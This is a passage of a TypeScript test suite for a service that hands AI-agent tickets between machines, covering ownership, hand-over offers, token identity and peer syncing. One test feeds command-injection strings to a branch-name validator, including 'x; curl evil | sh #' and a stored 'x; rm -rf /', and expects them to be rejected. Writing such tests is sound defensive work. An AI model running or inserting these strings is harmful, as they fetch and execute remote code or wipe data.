  await assert.rejects(service.ledgerAccept({ key: 'ZED-201' }, 'workspace'), /not offered to this machine/);
  assert.strictEqual(await service.ledgerHandover({ ...offer, key: 'ZED-999' }, 'laptop', at(1)), null);
  assert.strictEqual(await service.ledgerGet({ key: 'ZED-999' }, 'laptop'), null);

  const offered = await service.ledgerHandover(offer, 'laptop', at(2));
  assert.deepStrictEqual(offered?.handover, { from: 'laptop', to: 'workspace', at: at(2).toISOString(), note: 'tests next', branches: offer.branches });
  const shown = await service.get('ZED-201', at(3));
  assert.deepStrictEqual([shown?.machine, shown?.handoverTo, shown?.handoverAt], ['laptop', 'workspace', at(2).toISOString()]);
  assert.deepStrictEqual((await service.ledgerList('workspace')).runs.map((run) => [run.key, run.handoverTo, run.mine]), [['ZED-201', 'workspace', false]], 'the offered ticket is listed, the other one is not');
  assert.strictEqual(await service.ledgerGet({ key: 'ZED-102' }, 'workspace'), null);
  const read = await service.ledgerGet({ key: 'ZED-201' }, 'workspace');
  assert.deepStrictEqual([read?.machine, read?.handover?.to, (read?.ledger as { history: unknown }).history], ['laptop', 'workspace', base.history]);
  await assert.rejects(service.ledgerAccept({ key: 'ZED-201' }, 'laptop-two'), /not offered to this machine/);

  const newer = await push('laptop', 4, { stage: 'test' });
  assert.deepStrictEqual([newer.ignored, newer.handoverTo], [false, 'workspace'], 'the owner keeps working: the offer stays and the shared copy follows');
  assert.strictEqual(JSON.parse(runs.get('ZED-201').ledgerRaw).stage, 'test');
  const ignored = await push('workspace', 5, { stage: 'pr' });
  assert.deepStrictEqual([ignored.ignored, ignored.machine], [true, 'laptop'], 'an offer alone does not move the ticket');

  const accepted = await service.ledgerAccept({ key: 'ZED-201' }, 'workspace');
  assert.deepStrictEqual([accepted?.machine, accepted?.handover], ['workspace', null]);
  assert.deepStrictEqual(events.filter((event) => ['HANDOVER', 'MACHINE'].includes(event.kind)).map((event) => [event.kind, event.detail]), [['HANDOVER', 'workspace'], ['MACHINE', 'workspace']]);
  assert.deepStrictEqual(await service.ledgerAccept({ key: 'ZED-201' }, 'workspace'), accepted, 'accepting twice returns the same result');
  assert.strictEqual(events.filter((event) => event.kind === 'MACHINE').length, 1);

  await service.ingestHookEvent({ key: 'ZED-201', event: 'PreToolUse', detail: 'Read' }, at(8), 'workspace');
  const back = await push('laptop', 9, { stage: 'done' });
  assert.deepStrictEqual([back.ignored, back.machine, back.stage], [true, 'workspace', 'test'], 'the previous owner cannot take the ticket back');
  const quiet = await service.ingestLedger({ ...base, stage: 'done', updatedAt: at(500).toISOString() }, at(500), 'laptop');
  assert.strictEqual(quiet.ignored, true, 'not even after the new owner has gone quiet');
  await assert.rejects(service.ledgerHandover({ key: 'ZED-201', to: 'workspace' }, 'laptop', at(10)), /Only the owning machine/);

  await service.ledgerHandover({ key: 'ZED-201', to: 'laptop' }, 'workspace', at(11));
  assert.deepStrictEqual(await service.ledgerHandover({ key: 'ZED-201', cancel: true }, 'workspace', at(12)), { key: 'ZED-201', handover: null });
  await assert.rejects(service.ledgerAccept({ key: 'ZED-201' }, 'laptop'), /not offered to this machine/);
});

test('moving a ticket from the dashboard needs no offer', async () => {
  const { storage, events, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  await service.ingestLedger({ ...ledger, key: 'ZED-201', waiting: '', updatedAt: now.toISOString() }, now, 'laptop');
  await service.ledgerHandover({ key: 'ZED-201', to: 'workspace' }, 'laptop', now);

  const moved = await service.moveRun('zed-201', 'Workspace', now);
  assert.deepStrictEqual([moved.machine, moved.handoverTo], ['workspace', null]);
  assert.strictEqual(runs.get('ZED-201').handover, null);
  assert.deepStrictEqual(events.filter((event) => event.kind === 'MACHINE').map((event) => event.detail), ['workspace']);
  assert.strictEqual((await service.moveRun('ZED-201', 'workspace', now)).machine, 'workspace', 'moving to the owner changes nothing');
  assert.strictEqual(events.filter((event) => event.kind === 'MACHINE').length, 1);
  assert.strictEqual((await service.ledgerAccept({ key: 'ZED-201' }, 'workspace'))?.machine, 'workspace', 'the accept after a move is idempotent');
  assert.strictEqual((await service.ingestLedger({ ...ledger, key: 'ZED-201', updatedAt: now.toISOString() }, now, 'laptop')).ignored, true);
  await assert.rejects(service.moveRun('ZED-201', 'phone', now), /Unknown machine/);
  await assert.rejects(service.moveRun('ZED-404', 'laptop', now), /Unknown ticket/);
});

test('the machine comes from the token, never from the request body', async (t) => {
  const { storage, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  const laptop = await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const app = express();
  app.use('/ingest/orchestrator', createOrchestratorIngestRouter(service, new PinRateLimiter(2, 60_000)));
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  assert.ok(address && typeof address !== 'string');
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));
  const post = (route: string, body: unknown, bearer: string) => fetch(`http://127.0.0.1:${address.port}/ingest/orchestrator${route}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', authorization: `Bearer ${bearer}` },
    body: JSON.stringify(body),
  });
  const now = new Date();
  const zed = { ...ledger, key: 'ZED-102', waiting: '', updatedAt: new Date(now.getTime() - 60_000).toISOString() };

  const first = await post('', { ...zed, machine: 'workspace' }, laptop.token);
  assert.strictEqual(first.status, 200);
  assert.strictEqual(runs.get('ZED-102').machine, 'laptop', 'a body naming another machine is ignored');
  assert.strictEqual((await post('/event', { key: 'ZED-102', event: 'PreToolUse', detail: 'Edit' }, laptop.token)).status, 200);
  assert.strictEqual(runs.get('ZED-102').activity, 'ACTIVE');

  const other = await post('', { ...zed, stage: 'pr', machine: 'laptop', updatedAt: now.toISOString() }, workspace.token);
  assert.deepStrictEqual(await other.json(), { ok: true, result: { key: 'ZED-102', ignored: true, owner: 'laptop' } });

  const event = await post('/event', { key: 'ZED-102', event: 'Notification', machine: 'laptop' }, workspace.token);
  assert.strictEqual(event.status, 200);
  assert.strictEqual(runs.get('ZED-102').activity, 'ACTIVE', 'activity from the other machine is dropped');
});

async function serveIngest(t: { after: (fn: () => Promise<void>) => void }, service: OrchestratorService, chat?: ChatService) {
  const app = express();
  app.use('/ingest/orchestrator', createOrchestratorIngestRouter(service, new PinRateLimiter(2, 60_000), chat));
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  assert.ok(address && typeof address !== 'string');
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));
  return async (route: string, body: unknown, bearer: string) => {
    const response = await fetch(`http://127.0.0.1:${address.port}/ingest/orchestrator${route}`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${bearer}` },
      body: JSON.stringify(body),
    });
    return { status: response.status, body: await response.json() as any };
  };
}

test('every ticket route acts as the machine of the token', async (t) => {
  const { storage, runs } = memoryStorage();
  const directory = await mkdtemp(path.join(os.tmpdir(), 'dock-routes-'));
  t.after(() => rm(directory, { recursive: true, force: true }));
  const service = new OrchestratorService(storage, directory);
  await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const post = await serveIngest(t, service);
  const zed = { ...ledger, key: 'ZED-301', waiting: '', updatedAt: new Date(Date.now() - 60_000).toISOString() };

  assert.strictEqual((await post('', zed, workspace.token)).body.result.ignored, undefined);
  assert.strictEqual(runs.get('ZED-301').machine, 'workspace', '/ creates the ticket for the token machine');
  assert.strictEqual((await post('/event', { key: 'ZED-301', event: 'PreToolUse', detail: 'Edit' }, workspace.token)).body.result.ignored, undefined);
  assert.strictEqual(runs.get('ZED-301').activityDetail, 'Edit', '/event is applied');
  assert.strictEqual((await post('/events', { key: 'ZED-301', events: [{ event: 'PreToolUse', tool: 'Bash' }] }, workspace.token)).body.result.ignored, undefined);
  assert.strictEqual(runs.get('ZED-301').activityDetail, 'Bash', '/events is applied');
  assert.deepStrictEqual((await post('/transcript', { key: 'ZED-301', files: [{ path: 'a.jsonl', text: '{}' }] }, workspace.token)).body.result.files, 1);
  assert.notStrictEqual(await service.readTranscript('ZED-301'), null, '/transcript is stored');
  assert.deepStrictEqual((await post('/ledger/list', {}, workspace.token)).body.result.runs.map((run: { key: string; mine: boolean }) => [run.key, run.mine]), [['ZED-301', true]]);
  assert.strictEqual((await post('/ledger/get', { key: 'ZED-301' }, workspace.token)).body.result.machine, 'workspace');
  assert.strictEqual((await post('/ledger/handover', { key: 'ZED-301', to: 'laptop' }, workspace.token)).body.result.handover.from, 'workspace');

  await service.ingestLedger({ ...zed, key: 'ZED-302' }, new Date(), 'laptop');
  await service.ledgerHandover({ key: 'ZED-302', to: 'workspace' }, 'laptop');
  assert.strictEqual((await post('/ledger/accept', { key: 'ZED-302' }, workspace.token)).body.result.machine, 'workspace');
});

test('a push from a machine that does not own the ticket says so', async (t) => {
  const { storage, runs } = memoryStorage();
  const directory = await mkdtemp(path.join(os.tmpdir(), 'dock-ignored-'));
  t.after(() => rm(directory, { recursive: true, force: true }));
  const service = new OrchestratorService(storage, directory);
  await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const post = await serveIngest(t, service);
  await service.ingestLedger({ ...ledger, key: 'ZED-303', waiting: '' }, new Date(), 'laptop');

  const event = await post('/event', { key: 'ZED-303', event: 'PreToolUse' }, workspace.token);
  const events = await post('/events', { key: 'ZED-303', events: [{ event: 'PreToolUse', tool: 'Bash' }] }, workspace.token);
  const transcript = await post('/transcript', { key: 'ZED-303', files: [{ path: 'a.jsonl', text: '{}' }] }, workspace.token);
  for (const response of [event, events, transcript]) {
    assert.strictEqual(response.status, 200, 'the deployed kit keeps working');
    assert.strictEqual(response.body.result.ignored, true);
    assert.strictEqual(response.body.result.owner, 'laptop');
  }
  assert.strictEqual(runs.get('ZED-303').activity, 'IDLE');
  assert.strictEqual(await service.readTranscript('ZED-303'), null);
});

test('a machine reads only the tickets it owns or is offered', async () => {
  const { storage } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  await service.ingestLedger({ ...ledger, key: 'ZED-310', waiting: '', secret: 'only for the laptop' }, now, 'laptop');
  assert.strictEqual(await service.ledgerGet({ key: 'ZED-310' }, 'workspace'), await service.ledgerGet({ key: 'ZED-404' }, 'workspace'), 'a hidden ticket answers exactly like a missing one');
  assert.deepStrictEqual((await service.ledgerList('workspace')).runs, []);
  await service.ledgerHandover({ key: 'ZED-310', to: 'workspace' }, 'laptop', now);
  assert.strictEqual((await service.ledgerGet({ key: 'ZED-310' }, 'workspace'))?.machine, 'laptop');
  await service.ledgerHandover({ key: 'ZED-310', cancel: true }, 'laptop', now);
  assert.strictEqual(await service.ledgerGet({ key: 'ZED-310' }, 'workspace'), null, 'a cancelled offer closes the read again');
});

test('a dismissed ticket is taken only when its machine has no live token', async () => {
  const { storage, runs, events } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  const push = (key: string, machine: string, title = 'Zed') => service.ingestLedger({ ...ledger, key, title, waiting: '', updatedAt: now.toISOString() }, now, machine);

  await push('ZED-320', 'laptop');
  await service.ingestHookEvent({ key: 'ZED-320', event: 'PreToolUse', detail: 'Bash' }, now, 'laptop');
  await service.dismiss('ZED-320', 'laptop');
  assert.strictEqual((await push('ZED-320', 'laptop')).ignored, false, 'the owner revives its own dismissed ticket');
  assert.strictEqual(runs.get('ZED-320').activity, 'ACTIVE', 'a revival by the owner keeps its history');

  await service.dismiss('ZED-320', 'laptop');
  const refused = await push('ZED-320', 'workspace', 'Pusher title');
  assert.deepStrictEqual([refused.ignored, refused.machine], [true, 'laptop'], 'another machine cannot take a ticket whose owner still has a token');
  assert.deepStrictEqual([runs.get('ZED-320').machine, runs.get('ZED-320').title, runs.get('ZED-320').dismissedAt === null], ['laptop', 'Zed', false], 'the row stays dismissed');
  assert.strictEqual(events.filter((event) => event.kind === 'MACHINE').length, 0);

  assert.strictEqual((await service.moveRun('ZED-320', 'workspace', now)).machine, 'workspace', 'a dismissed ticket can be moved from the dashboard');
  await service.ingestHookEvent({ key: 'ZED-320', event: 'PreToolUse', detail: 'Edit' }, now, 'workspace');
  runs.set('ZED-320', { ...runs.get('ZED-320'), lastEventAt: now, transcriptAt: now });
  await service.dismiss('ZED-320', 'workspace');
  assert.strictEqual((await push('ZED-320', 'laptop')).ignored, true, 'the same rule holds for the new owner');

  await service.revokeToken(workspace.record.id);
  const taken = await push('ZED-320', 'laptop', 'Taken');
  assert.deepStrictEqual([taken.ignored, taken.machine, runs.get('ZED-320').dismissedAt], [false, 'laptop', null], 'a machine without a live token loses a dismissed ticket');
  assert.deepStrictEqual(
    [runs.get('ZED-320').activity, runs.get('ZED-320').activityDetail, runs.get('ZED-320').activityEndedAt, runs.get('ZED-320').lastEventAt, runs.get('ZED-320').transcriptAt],
    ['IDLE', null, null, null, null],
    'the old machine history is not shown as the new owner',
  );
  assert.strictEqual(events.filter((event) => event.kind === 'MACHINE').length, 2, 'the move and the take are logged');

  await service.dismiss('ZED-320', 'laptop');
  assert.strictEqual((await service.moveRun('ZED-320', 'laptop', now)).machine, 'laptop', 'a dismissed ticket can be moved');
});

test('the cap of live tickets applies to creating and reviving, never to an accept or a move', async () => {
  const { storage, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  const push = (key: string, machine: string) => service.ingestLedger({ ...ledger, key, waiting: '', updatedAt: now.toISOString() }, now, machine);

  await push('ZED-321', 'laptop');
  await push('ZED-322', 'laptop');
  await service.ledgerHandover({ key: 'ZED-321', to: 'workspace' }, 'laptop', now);
  for (let n = 1; n <= 300; n += 1) runs.set(`CAP-${n}`, { key: `CAP-${n}`, machine: 'workspace', dismissedAt: null });

  await assert.rejects(push('ZED-323', 'workspace'), /maximum of 300 live tickets.*Dismiss finished tickets on the Agents page/);
  assert.strictEqual((await push('CAP-1', 'workspace')).ignored, false, 'a ticket the machine already has keeps updating');
  assert.strictEqual((await push('ZED-323', 'laptop')).ignored, false, 'the cap is per machine');

  await service.dismiss('ZED-322', 'laptop');
  runs.set('ZED-322', { ...runs.get('ZED-322'), machine: 'workspace' });
  await assert.rejects(push('ZED-322', 'workspace'), /maximum of 300 live tickets/, 'reviving a dismissed ticket counts');

  assert.strictEqual((await service.ledgerAccept({ key: 'ZED-321' }, 'workspace'))?.machine, 'workspace', 'accept at the cap succeeds');
  assert.strictEqual((await service.moveRun('ZED-323', 'workspace', now)).machine, 'workspace', 'move at the cap succeeds');
});

test('a push that read the ticket before it moved cannot put the old owner back', async () => {
  const { storage, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  const base = { ...ledger, key: 'ZED-330', waiting: '', updatedAt: now.toISOString() };
  await service.ingestLedger(base, now, 'laptop');
  await service.ledgerHandover({ key: 'ZED-330', to: 'workspace' }, 'laptop', now);

  const read = storage.getOrchestratorRun.bind(storage);
  let moved = false;
  (storage as unknown as { getOrchestratorRun: unknown }).getOrchestratorRun = async (key: string) => {
    const row = await read(key);
    if (!moved) {
      moved = true;
      await service.ledgerAccept({ key }, 'workspace');
    }
    return row;
  };
  const late = await service.ingestLedger({ ...base, stage: 'test' }, now, 'laptop');
  assert.deepStrictEqual([late.ignored, late.machine], [true, 'workspace'], 'the push that lost the race reports ignored');
  assert.deepStrictEqual([runs.get('ZED-330').machine, runs.get('ZED-330').stage], ['workspace', 'verify']);

  const stale = await storage.changeOrchestratorRunOwner('ZED-330', { machine: 'laptop', handover: null }, 'laptop');
  assert.strictEqual(stale, false, 'a move that read an old owner fails cleanly');
});

test('a hand-over takes safe branch names and a plain note', async () => {
  const { storage } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  await service.createToken('workspace', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  await service.ingestLedger({ ...ledger, key: 'ZED-340', waiting: '', updatedAt: now.toISOString() }, now, 'laptop');
  const offer = (extra: object) => service.ledgerHandover({ key: 'ZED-340', to: 'workspace', ...extra }, 'laptop', now);

  for (const bad of ['x; curl evil | sh #', '$(id)', 'a b', '`id`', 'feat/../x', '-rf', 'a'.repeat(201), 'a\nb']) {
    await assert.rejects(offer({ branches: { be: bad } }), /branches\.be is not a valid branch name/, bad);
    await assert.rejects(offer({ branches: { fe: bad } }), /branches\.fe is not a valid branch name/, bad);
  }
  await assert.rejects(offer({ branches: { be: 7 } }), OrchestratorInputError);
  const ok = await offer({ branches: { be: 'feat/zed-340_be.1', fe: '  release/1.2  ' }, note: `line one\nline two\u0007\u001b[31m${'x'.repeat(600)}` });
  assert.deepStrictEqual(ok?.handover?.branches, { be: 'feat/zed-340_be.1', fe: 'release/1.2' });
  assert.ok(!/[\u0000-\u001f\u007f-\u009f]/.test(ok?.handover?.note ?? ''), 'control characters are gone');
  assert.strictEqual(ok?.handover?.note?.length, 500);
  assert.deepStrictEqual((await offer({}))?.handover?.branches, { be: null, fe: null });

  await storage.updateOrchestratorRun('ZED-340', { handover: JSON.stringify({ from: 'laptop', to: 'workspace', at: now.toISOString(), note: 7, branches: { be: 'x; rm -rf /', fe: 'feat/ok' } }) });
  assert.deepStrictEqual((await service.get('ZED-340'))?.handoverTo, 'workspace');
  assert.deepStrictEqual((await service.ledgerGet({ key: 'ZED-340' }, 'workspace'))?.handover, { from: 'laptop', to: 'workspace', at: now.toISOString(), note: null, branches: { be: null, fe: 'feat/ok' } }, 'a stored offer is read back through the same checks');
  await storage.updateOrchestratorRun('ZED-340', { handover: JSON.stringify({ to: 'workspace' }) });
  assert.strictEqual((await service.get('ZED-340'))?.handoverTo, null, 'an offer without its shape is no offer');
});

test('cancelling an offer is logged and revoking a token withdraws the offers made to it', async () => {
  const { storage, events, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const spare = await service.createToken('spare', 'workspace');
  const now = new Date('2026-10-05T00:00:00.000Z');
  for (const key of ['ZED-350', 'ZED-351']) {
    await service.ingestLedger({ ...ledger, key, waiting: '', updatedAt: now.toISOString() }, now, 'laptop');
    await service.ledgerHandover({ key, to: 'workspace' }, 'laptop', now);
  }
  await service.ledgerHandover({ key: 'ZED-350', cancel: true }, 'laptop', now);
  assert.deepStrictEqual(events.filter((event) => event.kind === 'HANDOVER_CANCELLED').map((event) => [event.ticketKey, event.detail]), [['ZED-350', 'workspace']]);
  await service.ledgerHandover({ key: 'ZED-350', cancel: true }, 'laptop', now);
  assert.strictEqual(events.filter((event) => event.kind === 'HANDOVER_CANCELLED').length, 1, 'cancelling nothing logs nothing');

  await service.revokeToken(workspace.record.id);
  assert.notStrictEqual(runs.get('ZED-351').handover, null, 'another token still names the machine');
  await service.revokeToken(spare.record.id);
  assert.strictEqual(runs.get('ZED-351').handover, null, 'no token is left for the machine');
  assert.deepStrictEqual(events.filter((event) => event.kind === 'HANDOVER_CANCELLED').map((event) => [event.ticketKey, event.detail]), [['ZED-350', 'workspace'], ['ZED-351', 'workspace (token revoked)']], 'revoking the last token logs the withdrawn offer');
});

test('the peer routes list every machine, return one run with its events, and dismiss only the token machine', async (t) => {
  const { storage, runs } = memoryStorage();
  const service = new OrchestratorService(storage, os.tmpdir());
  const laptop = await service.createToken('laptop');
  const workspace = await service.createToken('workspace', 'workspace');
  const post = await serveIngest(t, service);
  const now = new Date();
  await service.ingestLedger({ ...ledger, key: 'ZED-401', waiting: '', updatedAt: now.toISOString() }, now, 'laptop');
  await service.ingestLedger({ ...ledger, key: 'ZED-402', waiting: '', updatedAt: now.toISOString() }, now, 'workspace');

  for (const token of [laptop.token, workspace.token]) {
    assert.deepStrictEqual((await post('/runs', {}, token)).body.result.map((run: { key: string; machine: string }) => [run.key, run.machine]), [['ZED-401', 'laptop'], ['ZED-402', 'workspace']]);
  }
  const one = (await post('/runs/get', { key: 'ZED-401' }, workspace.token)).body.result;
  assert.deepStrictEqual([one.key, one.events.map((event: { kind: string }) => event.kind)], ['ZED-401', ['STAGE']]);
  assert.strictEqual((await post('/runs/get', { key: 'ZED-404' }, workspace.token)).status, 404);

  const refused = await post('/dismiss', { key: 'ZED-401' }, workspace.token);
  assert.deepStrictEqual([refused.status, refused.body.error], [400, 'This run belongs to laptop. Hide it on that DOCK.']);
  assert.strictEqual(runs.get('ZED-401').dismissedAt, null);
  assert.strictEqual((await post('/dismiss', { key: 'ZED-402' }, workspace.token)).body.result, true);
  assert.ok(runs.get('ZED-402').dismissedAt, 'the owner dismisses its own run');
});

test('the workspace DOCK copies its runs to the peer and a dead peer never fails the local ingest', async (t) => {
  const vps = memoryStorage();
  const vpsService = new OrchestratorService(vps.storage, os.tmpdir());
  await vpsService.createToken('laptop');
  const workspaceToken = await vpsService.createToken('workspace', 'workspace');
  const app = express();
  app.use('/ingest/orchestrator', createOrchestratorIngestRouter(vpsService, new PinRateLimiter(2, 60_000)));
  const server = http.createServer(app);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  assert.ok(address && typeof address !== 'string');
  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));

  const pending: Promise<void>[] = [];
  const track = (peer: LedgerPeer) => ({ forward: (route: string, body: unknown) => { const copy = peer.forward(route, body); pending.push(copy); return copy; } });
  const settle = () => Promise.all(pending.splice(0));
  const local = memoryStorage();
  const service = new OrchestratorService(local.storage, os.tmpdir(), null, track(new LedgerPeer(`http://127.0.0.1:${address.port}/ingest/orchestrator/`, workspaceToken.token)));
  await service.createToken('workspace', 'workspace');
  const now = new Date();

  await service.ingestLedger({ ...ledger, key: 'ZED-410', waiting: '', updatedAt: now.toISOString() }, now, 'workspace');
  await settle();
  assert.strictEqual(vps.runs.get('ZED-410').machine, 'workspace', 'the ledger is copied as the workspace machine');
  await service.ingestHookEvent({ key: 'ZED-410', event: 'PreToolUse', detail: 'Edit' }, now, 'workspace');
  await settle();
  assert.strictEqual(vps.runs.get('ZED-410').activityDetail, 'Edit', 'a hook event is copied');
  await service.ingestEventBatch({ key: 'ZED-410', events: [{ event: 'PreToolUse', tool: 'Bash' }] }, now, 'workspace');
  await settle();
  assert.strictEqual(vps.runs.get('ZED-410').activityDetail, 'Bash', 'an event batch is copied');

  await vpsService.ingestLedger({ ...ledger, key: 'ZED-411', waiting: '', updatedAt: now.toISOString() }, now, 'laptop');
  local.runs.set('ZED-411', { ...vps.runs.get('ZED-411') });
  assert.strictEqual((await service.ingestLedger({ ...ledger, key: 'ZED-411', waiting: '', updatedAt: now.toISOString() }, now, 'workspace')).ignored, true);
  assert.strictEqual(pending.length, 0, 'an ignored push is not copied');

  await service.dismiss('ZED-410', 'workspace');
  await settle();
  assert.ok(vps.runs.get('ZED-410').dismissedAt, 'a dismissal is copied');

  const dead = new OrchestratorService(memoryStorage().storage, os.tmpdir(), null, track(new LedgerPeer('http://127.0.0.1:9/ingest/orchestrator', 'nobody', 500)));
  await dead.createToken('workspace', 'workspace');
  const warn = t.mock.method(console, 'warn', () => undefined);
  assert.strictEqual((await dead.ingestLedger({ ...ledger, key: 'ZED-412', waiting: '', updatedAt: now.toISOString() }, now, 'workspace')).ignored, false);
  await settle();
  assert.strictEqual(warn.mock.callCount(), 1, 'the failed copy is only logged');
});

test('a resync sends the live runs of this machine and the dismissals of the last day again', async () => {
  const { storage, runs } = memoryStorage();
  const sent: Array<[string, unknown]> = [];
  const service = new OrchestratorService(storage, os.tmpdir(), null, { forward: async (route, body) => { sent.push([route, body]); } });
  const now = new Date('2026-10-16T12:00:00.000Z');
  const push = (key: string, machine: string) => service.ingestLedger({ ...ledger, key, waiting: '', updatedAt: now.toISOString() }, now, machine);
  await push('ZED-420', 'workspace');
  await push('ZED-421', 'workspace');
  await push('ZED-422', 'workspace');
  await push('ZED-423', 'laptop');
  runs.set('ZED-421', { ...runs.get('ZED-421'), dismissedAt: new Date(now.getTime() - 3600_000) });
  runs.set('ZED-422', { ...runs.get('ZED-422'), dismissedAt: new Date(now.getTime() - 2 * 24 * 3600_000) });
  sent.length = 0;

  assert.strictEqual(await service.resyncPeer('workspace', now), 2);
  assert.deepStrictEqual(sent.map(([route, body]) => [route, (body as { key: string }).key]), [['', 'ZED-420'], ['/dismiss', 'ZED-421']]);
  assert.ok(!('dirs' in (sent[0][1] as object)), 'local paths stay on this machine');
  assert.strictEqual(await new OrchestratorService(storage, os.tmpdir()).resyncPeer('workspace', now), 0, 'without a peer nothing is sent');
});
